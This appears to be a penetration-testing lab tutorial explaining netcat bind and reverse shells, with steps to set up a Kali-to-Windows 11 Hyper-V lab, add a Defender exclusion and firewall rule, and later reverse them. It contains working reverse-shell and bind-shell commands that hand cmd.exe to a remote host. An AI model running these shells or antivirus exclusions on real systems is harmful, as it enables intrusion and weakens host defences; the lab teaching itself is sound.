# Understanding Shells and Hyper-V Lab Setup

## 1. The Anatomy of Shells
In penetration testing, a "shell" refers to gaining command-line access to a remote system. Netcat is the primary vehicle for establishing these connections.

### Bind Shell
* **Concept:** The **Target** opens a local port and waits. The **Attacker** connects to that port.
* **Analogy:** The target leaves their front door open, and the attacker walks in.
* **Limitation:** Highly susceptible to firewalls, as most networks block arbitrary inbound traffic.
* **Syntax:**
    * *Target:* `ncat.exe -lvnp 4444 -e cmd.exe`
    * *Attacker:* `nc -nv <Target_IP> 4444`

### Reverse Shell
* **Concept:** The **Attacker** opens a local port and waits. The **Target** connects back to the attacker.
* **Analogy:** The attacker waits at home, and the target calls them.
* **Advantage:** Often bypasses firewalls because outbound traffic (like browsing the web) is generally permitted.
* **Syntax:**
    * *Attacker:* `nc -lvnp 4444`
    * *Target:* `ncat.exe -nv <Attacker_IP> 4444 -e cmd.exe`

---

## 2. Granular Lab Setup: Kali Linux to Windows 11
Establishing communication between a Windows 11 host and a Kali Linux Hyper-V guest requires navigating modern zero-trust OS architecture.

### Phase 1: Network Reconnaissance
Identify the IP addresses of both machines communicating over the Hyper-V Default Switch.
* **Windows 11 (Host):** Open Command Prompt, run `ipconfig`, and locate the `vEthernet (Default Switch)` IPv4 address.
* **Kali Linux (Guest):** Open Terminal, run `ip a`, and locate the `eth0` interface `inet` address.

### Phase 2: Bypassing PowerShell Execution Policies
To configure the firewall, administrative context is required.
1.  Open **PowerShell as Administrator**.
2.  Adjust the execution policy to allow local administrative commands:
    ```PowerShell
    Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
    ```

### Phase 3: Granular Windows Defender Exclusions
Windows Defender will flag Ncat/Netcat binaries heuristically. Create a sanctioned "Safe Zone" rather than disabling the antivirus.
1.  Create the directory: `C:\CyberLab_Tools`
2.  Open **Windows Security** -> **Virus & threat protection** -> **Manage settings**.
3.  Scroll to **Exclusions** -> **Add or remove exclusions**.
4.  Add the `C:\CyberLab_Tools` folder.
5.  Extract `ncat.exe` strictly into this directory.

### Phase 4: Poking the Firewall Hole
Allow inbound traffic strictly on the required testing port to maintain the overall host security posture.
1.  In the Administrator PowerShell, create the exception rule:
    ```PowerShell
    New-NetFirewallRule -DisplayName "Lab Exception - Ncat Port 4444" -Direction Inbound -LocalPort 4444 -Protocol TCP -Action Allow
    ```

### Phase 5: Execution
Establish the Reverse Shell using the whitelisted environment.
1.  **Attacker (Kali):** Start the listener.
    ```bash
    nc -lvnp 4444
    ```
2.  **Target (Windows 11):** Navigate to the safe directory and execute the payload.
    ```cmd
    cd C:\CyberLab_Tools
    ncat.exe -nv <Kali_IP> 4444 -e cmd.exe
    ```
3.  **Result:** The Kali terminal will present the Windows `cmd.exe` prompt, granting remote execution.

# Cleaning up the environment to cleanly reverse the security exceptions, close the ports, and restore Windows 11 to its default zero-trust posture

## 1. Step 1: Close the Firewall Port
The inbound rule allowing TCP traffic over port 4444 needs to be deleted.
1. Open PowerShell as Administrator.
2. Execute the removal command targeting the exact name of the rule created earlier:
   ```PowerShell
   Remove-NetFirewallRule -DisplayName "Lab Exception - Ncat Port 4444"
   ```

## 2. Step 2: Remove the Windows Defender Exclusion
Windows Defender needs to resume monitoring the directory used for the Ncat binaries. You can remove the exclusion directly via PowerShell instead of clicking through the Windows Security GUI:
1. In the same Administrator PowerShell window, run:
```PowerShell
Remove-MpPreference -ExclusionPath "C:\CyberLab_Tools"
```

2. Now that the antivirus is watching that space again, securely delete the folder and the tools inside it to prevent Defender from immediately flagging the leftover binaries:
```PowerShell
Remove-Item -Path "C:\CyberLab_Tools" -Recurse -Force
```

## 3. Step 3: Revert the PowerShell Execution Policy
Finally, restore the execution policy to its default, restrictive state to prevent unauthorized scripts from running.
1. Run the following command:
```PowerShell
Set-ExecutionPolicy Restricted -Scope CurrentUser
```
2. Type Y and hit Enter to confirm the change.
